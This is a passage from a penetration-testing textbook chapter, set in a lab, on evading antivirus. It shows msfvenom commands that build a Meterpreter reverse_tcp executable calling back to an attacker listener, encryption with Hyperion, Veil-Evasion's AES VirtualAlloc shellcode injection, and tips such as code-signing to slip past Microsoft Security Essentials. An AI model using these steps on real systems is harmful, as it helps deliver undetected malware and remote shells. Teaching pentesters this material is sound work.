}</pre></div></div><p>Now we need to compile the C program. We can’t use the built-in GCC program because it would compile our program to run on Linux systems, and we want to run it on a 32-bit Windows system. Instead, we’ll use the Mingw32 cross compiler from the Kali Linux repositories, which we installed in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>. If you haven’t already installed it, install it with <span class="strong"><strong><code class="literal">apt-get install mingw32</code></strong></span>, and then compile your custom C file with <span class="strong"><strong><code class="literal">i586-mingw32msvc-gcc</code></strong></span>. (Other than the program name, the syntax for using the cross compiler is the same as for Linux’s built-in GCC, discussed in <a class="xref" href="ch03.xhtml" title="Chapter 3. Programming">Chapter 3</a>.)</p><a id="pro_id00145"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c</strong></span></pre><p><a class="indexterm" id="iddle1025"/><a class="indexterm" id="iddle1139"/><a class="indexterm" id="iddle1350"/><a class="indexterm" id="iddle1489"/>Now upload the resulting executable to VirusTotal. As of this writing, 18 antivirus products detected the malicious file. That’s an improvement, but Microsoft Security Essentials is still catching our file.</p><p>We still need to work a little harder to get a malicious executable onto our Windows 7 system. (You could have better success with this technique with another cross compiler from another repository.)</p></div><div class="sect2" title="Encrypting Executables with Hyperion"><div class="titlepage"><div><div><h3 class="title" id="encrypting_executables_with_hyperion">Encrypting Executables with Hyperion</h3></div></div></div><p>Another way to obfuscate our payload is to encrypt it. One executable encrypter is Hyperion, which uses Advanced Execution Standard (AES) encryption, a current industry standard. After encrypting the executable, Hyperion throws away the encryption keys. When the executable runs, it brute-forces the encryption key to decrypt itself back to the original executable.</p><p>If you have any background in cryptography, this process should raise a lot of red flags. AES is currently considered a secure encryption standard. If the executable doesn’t have access to the encryption key, it should not be able to brute-force the key in any reasonable amount of time, certainly not fast enough for our program to run in the time window of our pentest. What’s going on?</p><p>As it turns out, Hyperion greatly reduces the possible keyspace for the encryption key, which means that binaries encrypted with it shouldn’t be considered cryptographically secure. However, because our goal and the goal of the Hyperion authors is to obfuscate the code to bypass antivirus detection, the fact that the key can be brute-forced is not a problem.</p><p>Let’s start by using Hyperion to encrypt at simple Meterpreter executable with no additional antivirus avoidance techniques, as shown in <a class="xref" href="ch12.xhtml#running_hyperion" title="Example 12-8. Running Hyperion">Example 12-8</a>. (We installed Hyperion in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>).</p><div class="example"><a id="running_hyperion"/><div class="example-title">Example 12-8. Running Hyperion</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe &gt; meterpreter.exe</strong></span>&#13;
root@kali:~# <span class="strong"><strong>cd Hyperion-1.0/</strong></span>&#13;
root@kali:~/Hyperion-1.0# <span class="strong"><strong>wine ../hyperion ../meterpreter.exe bypassavhyperion.exe</strong></span>❶&#13;
&#13;
Opening ../bypassav.exe&#13;
Copied file to memory: 0x117178&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
&#13;
Executing fasm.exe&#13;
&#13;
flat assembler  version 1.69.31&#13;
5 passes, 0.4 seconds, 92672 bytes.</pre></div></div><p><a class="indexterm" id="iddle1057"/><a class="indexterm" id="iddle1491"/><a class="indexterm" id="iddle1529"/><a class="indexterm" id="iddle1725"/><a class="indexterm" id="iddle2028"/><a class="indexterm" id="iddle2359"/>Hyperion was written to run on Windows systems, but we can run it on Kali Linux with the Wine program, as you can see in <a class="xref" href="ch12.xhtml#running_hyperion" title="Example 12-8. Running Hyperion">Example 12-8</a>. Be sure to change into the Hyperion directory created when you unzipped the source before running <span class="emphasis"><em>hyperion.exe</em></span> with Wine.</p><p>Hyperion takes two arguments: the name of the file to encrypt and the name of the encrypted output file. Run Hyperion to encrypt the simple Meterpreter executable as shown at ❶. The resulting file is in the Hyperion 1.0 directory, so upload it to VirusTotal from there.</p><p>Using just a Meterpreter executable generated with Msfvenom (with no encoding, custom templates, or anything else) and encrypting it with Hyperion resulted in 27 antivirus programs in VirusTotal detecting the malicious behavior. That’s not our lowest detection rate yet, but we have finally achieved our goal. As shown in <a class="xref" href="ch12.xhtml#microsoft_security_essentials_does_not_d" title="Figure 12-8. Microsoft Security Essentials does not detect malware.">Figure 12-8</a>, Microsoft Security Essentials did not detect any malicious activity!</p><div class="figure"><a id="microsoft_security_essentials_does_not_d"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00114"/><img alt="Microsoft Security Essentials does not detect malware." src="httpatomoreillycomsourcenostarchimages2030418.png.jpg"/></div></div><div class="figure-title">Figure 12-8. Microsoft Security Essentials does not detect malware.</div></div><p>Sure enough, we can download and run the Hyperion-encrypted executable on the Windows 7 system with antivirus protection and get a Meterpreter session. We haven’t achieved a 0 percent detection rate—the holy grail for antivirus bypass researchers—but we have been able to meet our pentest goals.</p><div class="note" title="Note"><h3 class="title"><a id="ch12note03"/>Note</h3><p>To lower our detection rate even more, try combining Hyperion encryption with other techniques from this section. For example, using Hyperion with a custom template dropped my detection number down to 14.</p></div></div><div class="sect2" title="Evading Antivirus with Veil-Evasion"><div class="titlepage"><div><div><h3 class="title" id="evading_antivirus_with_veil-evasion">Evading Antivirus with Veil-Evasion</h3></div></div></div><p>Even though we have successfully reached our goal of bypassing Microsoft Security Essentials on Windows 7, the antivirus landscape changes rapidly, so it is worthwhile to keep abreast of the latest tools and techniques. Veil-Evasion is a Python framework that automates creating antivirus-evading payloads, giving users the choice of multiple techniques. We covered installing Veil-Evasion on Kali Linux in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>; refer back if you need a refresher.</p><div class="note" title="Note"><h3 class="title"><a id="ch12note04"/>Note</h3><p>As updates are made to Veil-Evasion, your version may be different from what is shown here.</p></div><div class="sect3" title="Python Shellcode Injection with Windows APIs"><div class="titlepage"><div><div><h4 class="title" id="python_shellcode_injection_with_windows">Python Shellcode Injection with Windows APIs</h4></div></div></div><p><a class="indexterm" id="iddle1218"/><a class="indexterm" id="iddle1235"/><a class="indexterm" id="iddle2022"/><a class="indexterm" id="iddle2027"/><a class="indexterm" id="iddle2092"/><a class="indexterm" id="iddle2384"/>Previously we looked at using a custom C template to compile and execute shellcode. We can do something similar with Python’s Ctypes library, which gives us access to Windows API function calls and can create C-compatible data types. We can use Ctypes to access the Windows API VirtualAlloc, which creates a new executable memory region for the shellcode and locks the memory region in physical memory, to avoid a page fault as shellcode is copied in and executed. <code class="literal">RtlMoveMemory</code> is used to copy the shellcode bytes into the memory region created by VirtualAlloc. The <code class="literal">CreateThread</code> API creates a new thread to run the shellcode, and finally, <code class="literal">WaitForSingleObject</code> waits until the created thread is finished and our shellcode has finished running.</p><p>These steps collectively are referred to as the <span class="emphasis"><em>VirtualAlloc injection method</em></span>. This method, of course, would give us a Python script rather than a Windows executable, but you can use multiple tools to convert a Python script into a stand-alone executable.</p></div><div class="sect3" title="Creating Encrypted Python-Generated Executables with Veil-Evasion"><div class="titlepage"><div><div><h4 class="title" id="creating_encrypted_python-generated_exec">Creating Encrypted Python-Generated Executables with Veil-Evasion</h4></div></div></div><p>One of the methods implemented in Veil-Evasion uses the Python injection technique described earlier. To provide further antivirus protection, Veil-Evasion can use encryption. For our example, we will use Python VirtualAlloc injection combined with AES encryption, as we did in the Hyperion example earlier in this chapter.</p><p>To start Veil-Evasion, change directories to <span class="emphasis"><em>Veil-Evasion-master</em></span> and run <span class="emphasis"><em>./Veil-Evasion.py</em></span>. You should be presented with a menu-based prompt similar to those we saw in SET in the previous chapter, as shown in <a class="xref" href="ch12.xhtml#running_veil" title="Example 12-9. Running Veil">Example 12-9</a>.</p><div class="example"><a id="running_veil"/><div class="example-title">Example 12-9. Running Veil</div><div class="example-contents"><pre class="programlisting">root@kali:~/Veil-Evasion-master# <span class="strong"><strong>./Veil-Evasion.py</strong></span>&#13;
========================================================================&#13;
 Veil-Evasion | [Version]: 2.6.0&#13;
========================================================================&#13;
 [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework&#13;
========================================================================&#13;
&#13;
 Main Menu&#13;
&#13;
    28 payloads loaded&#13;
&#13;
 Available commands:&#13;
&#13;
    use         use a specific payload&#13;
    info        information on a specific payload&#13;
    list        list available payloads&#13;
    update      update Veil to the latest version&#13;
    clean       clean out payload folders&#13;
    checkvt     check payload hashes vs. VirusTotal&#13;
    exit        exit Veil</pre></div></div><p><a class="indexterm" id="iddle2360"/>To see all the available payloads in Veil-Evasion, enter <span class="strong"><strong><code class="literal">list</code></strong></span> at the prompt, as shown in <a class="xref" href="ch12.xhtml#veil-evasion_payloads" title="Example 12-10. Veil-Evasion payloads">Example 12-10</a>.</p><div class="example"><a id="veil-evasion_payloads"/><div class="example-title">Example 12-10. Veil-Evasion payloads</div><div class="example-contents"><pre class="programlisting">[&gt;] Please enter a command: <span class="strong"><strong>list</strong></span>&#13;
Available payloads:&#13;
    1)    auxiliary/coldwar_wrapper&#13;
    2)    auxiliary/pyinstaller_wrapper&#13;
&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
&#13;
    22)    python/meterpreter/rev_tcp&#13;
    ❶23)    python/shellcode_inject/aes_encrypt&#13;
    24)    python/shellcode_inject/arc_encrypt&#13;
    25)    python/shellcode_inject/base64_substitution&#13;
    26)    python/shellcode_inject/des_encrypt&#13;
    27)    python/shellcode_inject/flat&#13;
    28)    python/shellcode_inject/letter_substitution</pre></div></div><p>As of this writing, there are 28 ways to create executables implemented in Veil-Evasion. For this example, choose option 23 ❶ to use the VirtualAlloc injection method and encrypt it with AES encryption. Once you choose a method, Veil-Evasion will prompt you to change the method options from the default, if desired, as shown in <a class="xref" href="ch12.xhtml#using_python_virtualalloc_in_veil-evasio" title="Example 12-11. Using Python VirtualAlloc in Veil-Evasion">Example 12-11</a>.</p><div class="example"><a id="using_python_virtualalloc_in_veil-evasio"/><div class="example-title">Example 12-11. Using Python VirtualAlloc in Veil-Evasion</div><div class="example-contents"><pre class="programlisting">[&gt;] Please enter a command: <span class="strong"><strong>23</strong></span>&#13;
&#13;
Payload: python/shellcode_inject/aes_encrypt loaded&#13;
&#13;
 Required Options:&#13;
&#13;
 Name            Current Value    Description&#13;
 ----            -------------    -----------&#13;
❶compile_to_exe  Y                Compile to an executable&#13;
 expire_paylo    X                Optional: Payloads expire after "X" days&#13;
❷inject_method   Virtual          Virtual, Void, Heap&#13;
 use_pyherion    N                Use the pyherion encrypter&#13;
&#13;
 Available commands:&#13;
&#13;
    set             set a specific option value&#13;
    info            show information about the payload&#13;
    generate        generate payload&#13;
    back            go to the main menu&#13;
    exit            exit Veil</pre></div></div><p><a class="indexterm" id="iddle1773"/><a class="indexterm" id="iddle2142"/><a class="indexterm" id="iddle2362"/><a class="indexterm" id="iddle2495"/>By default, this payload will compile the Python script into an executable ❶ using <code class="literal">VirtualAlloc()</code> as the injection method ❷. These options are correct for our example, so enter <span class="strong"><strong><code class="literal">generate</code></strong></span> at the prompt. You are then prompted for details about the shellcode, as shown in <a class="xref" href="ch12.xhtml#generating_the_executable_in_veil-evasio" title="Example 12-12. Generating the executable in Veil-Evasion">Example 12-12</a>.</p><div class="example"><a id="generating_the_executable_in_veil-evasio"/><div class="example-title">Example 12-12. Generating the executable in Veil-Evasion</div><div class="example-contents"><pre class="programlisting">[?] Use msfvenom or supply custom shellcode?&#13;
&#13;
        1 - msfvenom (default)&#13;
        2 - Custom&#13;
&#13;
 [&gt;] Please enter the number of your choice: <span class="strong"><strong>1</strong></span>&#13;
&#13;
 [*] Press [enter] for windows/meterpreter/reverse_tcp&#13;
 [*] Press [tab] to list available payloads&#13;
 [&gt;] Please enter metasploit payload:&#13;
 [&gt;] Enter value for 'LHOST', [tab] for local IP: <span class="strong"><strong>192.168.20.9</strong></span>&#13;
 [&gt;] Enter value for 'LPORT': <span class="strong"><strong>2345</strong></span>&#13;
 [&gt;] Enter extra msfvenom options in OPTION=value syntax:&#13;
&#13;
 [*] Generating shellcode...&#13;
 [*] Press [enter] for 'payload'&#13;
 [&gt;] Please enter the base name for output files: <span class="strong"><strong>meterpreterveil</strong></span>&#13;
&#13;
 [?] How would you like to create your payload executable?&#13;
&#13;
        1 - Pyinstaller (default)&#13;
        2 - Py2Exe&#13;
&#13;
 [&gt;] Please enter the number of your choice: <span class="strong"><strong>1</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
 [*] Executable written to: /root/veil-output/compiled/meterpreterveil.exe&#13;
&#13;
 Language:    python&#13;
 Payload:    AESEncrypted&#13;
 Shellcode:    windows/meterpreter/reverse_tcp&#13;
 Options:    LHOST=192.168.20.9  LPORT=2345&#13;
 Required Options:    compile_to_exe=Y  inject_method=virtual  use_pyherion=N&#13;
 Payload File:    /root/veil-output/source/meterpreterveil.py&#13;
 Handler File:    /root/veil-output/handlers/meterpreterveil_handler.rc&#13;
&#13;
 [*] Your payload files have been generated, don't get caught!&#13;
 [!] And don't submit samples to any online scanner! ;)</pre></div></div><p>Veil-Evasion prompts you to select either Msfvenom to generate the shellcode or to provide custom shellcode. For our purposes, choose Msfvenom. The default payload is <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span>, so press <span class="smaller">enter</span> to select it. You should be prompted for the usual options, <code class="literal">LHOST</code> and <a class="indexterm" id="iddle1052"/><code class="literal">LPORT</code>, and for a filename for the generated executable. Finally, Veil-Evasion offers two Python to executable methods. Choose the default, <code class="literal">Pyinstaller</code>, to have Veil-Evasion generate the malicious executable and save it to the <span class="emphasis"><em>veil-output/compiled</em></span> directory.</p><p>As of this writing, the resulting executable sails right past Microsoft Security Essentials on our Windows 7 box. Veil-Evasion notes that you shouldn’t upload the resulting executable to online scanners, so at the author’s request we’ll forgo checking this example with VirusTotal. However, we can install other antivirus solutions besides Microsoft Security Essentials to see if the executable is flagged.</p><div class="note" title="Note"><h3 class="title"><a id="ch12note05"/>Note</h3><p>If you find the Veil-Evasion executables aren’t working, you might need to update Metasploit with Msfupdate. Since Veil-Evasion is not currently in the Kali Linux repos, the latest version you pull down when you set up may not match up with how Msfvenom works in the default Kali 1.0.6 install. Of course, if you update Metasploit with Msfupdate, other exercises in this book may change, as Metasploit’s functionality changes frequently. Therefore, you may want to save this exercise for a second pass through the book or use a second Kali Linux image if you don’t want the update to affect later exercises in the book.</p></div></div></div></div><div class="sect1" title="Hiding in Plain Sight"><div class="titlepage"><div><div><h2 class="title" id="hiding_in_plain_sight" style="clear: both">Hiding in Plain Sight</h2></div></div></div><p>Perhaps the best way to avoid antivirus programs is to avoid traditional payloads altogether. If you are familiar with coding for Windows, you can use Windows APIs to mimic the functionality of a payload. There is, of course, no rule that legitimate applications cannot open a TCP connection to another system and send data—essentially what our <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span> payload is doing.</p><p>You may find that instead of generating the payload with Msfvenom and attempting to hide it with the methods covered in this chapter, you get even better results just writing a C program that performs the payload functionality you want. You can even invest in a code-signing certificate to sign your binary executable, to make it look even more legitimate.</p><div class="note" title="Note"><h3 class="title"><a id="ch12note06"/>Note</h3><p>Turn Real-time protection in Microsoft Security Essentials back off before moving on to post exploitation.</p></div></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00035" style="clear: both">Summary</h2></div></div></div><p>We’ve looked at only a few techniques for bypassing antivirus detection in this chapter. The topic of bypassing antivirus solutions could take up an entire book, and by the time it was published, the book would already be wildly out of date. Pentesters and researchers are constantly coming up with new techniques to sneak past antivirus detection, and antivirus vendors are always adding new signatures and heuristics to catch them.</p><p>We looked at ways to use Metasploit to encode and embed payloads in legitimate executables. When we found that these techniques weren’t enough to evade Microsoft Security Essentials, we turned to techniques beyond Metasploit. We built a custom executable template and found that we were able to improve our results by combining techniques.</p><p>We were finally able to reach our goal of bypassing Microsoft Security Essentials using Hyperion. Though we never reached a 0 percent detection rate, we were able to bypass Microsoft Security Essentials as well as several other top antivirus solutions. We also looked at another tool, Veil-Evasion, which uses VirtualAlloc injection combined with encryption for even better evasion.</p><p>Having looked at a lot of ways to get onto systems, even ones without readily apparent vulnerabilities, we’ll now turn our attention to what we can do once we penetrate a system, as we enter the post-exploitation stage of pentesting.</p></div></section></body></html>